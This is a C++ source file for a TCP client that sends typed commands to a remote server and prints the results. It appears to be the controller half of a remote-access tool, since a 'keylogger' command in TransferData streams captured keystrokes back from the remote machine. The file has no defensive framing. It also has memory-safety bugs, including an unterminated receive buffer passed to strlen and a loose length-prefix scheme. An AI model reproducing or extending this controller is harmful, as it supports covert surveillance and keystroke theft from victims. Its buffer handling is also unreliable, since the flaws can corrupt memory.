#include "client.h"

void concatenate(char*& res, const char* buf, int &maxLength) {
    int length = strlen(res) + strlen(buf) + 1;
    if (length > maxLength) {
        maxLength = length;
        char temp[maxLength];
        strcpy(temp, res);
        for (int i = 0; i < strlen(buf); i++) {
            temp[i + strlen(res)] = buf[i];
        }
        temp[maxLength - 1] = '\0';
        free(res);
        res = (char*)malloc(maxLength * 2);
        strcpy(res,temp);
        maxLength += maxLength;
    } else {
        int idx = strlen(res);
        for (int i = idx; i < length - 1; i++) {
            res[i] = buf[i - idx];
        }
        res[length - 1] = '\0';
    }
}

Client::Client(char* ip, char* port) {
    strcpy(IP, ip);
    strcpy(PORT, port);
    char s[INET6_ADDRSTRLEN];

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    int rv = 0;

    if ((rv = getaddrinfo(IP, PORT, &hints, &serverinfo)) != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(rv));
        exit(1);
    }

    for (p = serverinfo; p != NULL; p = p->ai_next) {
        if ((sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
            perror("client: socket");
            continue;
        }

        if (connect(sockfd, p->ai_addr, p->ai_addrlen) == -1) {
            perror("client: connect");
            close(sockfd);
            continue;
        }

        break;
    }

    if (p == NULL) {
        fprintf(stderr, "client: failed to connect\n");
        exit(1);
    }

    inet_ntop(p->ai_family, get_in_addr((struct sockaddr *)p->ai_addr),
			s, sizeof s);
	printf("client: connecting to %s\n", s);
}

void* Client::get_in_addr(struct sockaddr* sa) {
    if (sa->sa_family == AF_INET) {
        return &(((struct sockaddr_in*)sa)->sin_addr);
    }

    return &(((struct sockaddr_in6*)sa)->sin6_addr);
}

int Client::sending(int sockfd, const void* buf, size_t len, int flags) {
    int bytesSent = send(sockfd, buf, len, flags);
    return bytesSent;
}

bool Client::sending(int sockfd, char* msg) {
    int length = strlen(msg);
    char temp[20];
    sprintf(temp,"%d",length);
    printf("from integer to char* %s\n", temp);

    this->sending(sockfd, (char*)&temp, sizeof(temp), 0);

    int bytesSent = this->sending(sockfd, msg, strlen(msg), 0);
    std::cout << "bytes sent: " << bytesSent << std::endl;
    return bytesSent == length;
}

int Client::receive(int sockfd, void* buf, size_t len, int flags) {
    int bytesReceived = recv(sockfd, buf, len, flags);
    return bytesReceived;
}

bool Client::receive(int sockfd, char*& res, int& maxLength) {
    char temp[20];
    memset(&temp, 0, sizeof(temp));
    this->receive(sockfd, (char*)&temp, sizeof(temp), 0);
    int totalDataSize = atoi(temp);

    std::cout << "total datasize to receive: " << totalDataSize << std::endl;

    char* data = (char*)malloc(totalDataSize + 1);
    int totalBytesReceived = this->receive(sockfd, data, totalDataSize + 1, 0);
    memset(res, 0, maxLength);
    concatenate(res,data,maxLength);

    std::cout << "total bytes received: " << totalBytesReceived << std::endl;

    free(data);

    return totalDataSize == totalBytesReceived;
}

void Client::TransferData() {
    while(1)
    {
        int maxLength = 10;
        char* msg = (char*) malloc(maxLength);
        //fflush(stdin); 
        std::cout <<"\n\t\t Client: ";
        std::string data;
        std::getline(std::cin, data);
        memset(msg, 0, maxLength);
        concatenate(msg,data.c_str(),maxLength);

        if(strcmp(msg,"exit") == 0)
        {
            std::cout << "\n##### End the session #####" << std::endl;
            this->sending(sockfd, msg);
            free(msg);
            break;
        }

        this->sending(sockfd, msg);

        if (strcmp(msg,"keylogger") == 0) {
            receiveKeyPress(sockfd);
        } else {
            int length = 10;
            char* res = (char*)malloc(length);
            memset(res, 0, length);

            if (this->receive(sockfd, res, length)) {
                if (strcmp(res, "exit") == 0) {
                    std::cout <<"##### Server has quit the session #####" << std::endl;
                    free(res);
                    free(msg);
                    break;
                } else {
                    printf("%s\n", res);
                }
            };

            free(res);
        }

        free(msg);
    }
}

Client::~Client() {
    close(sockfd);
}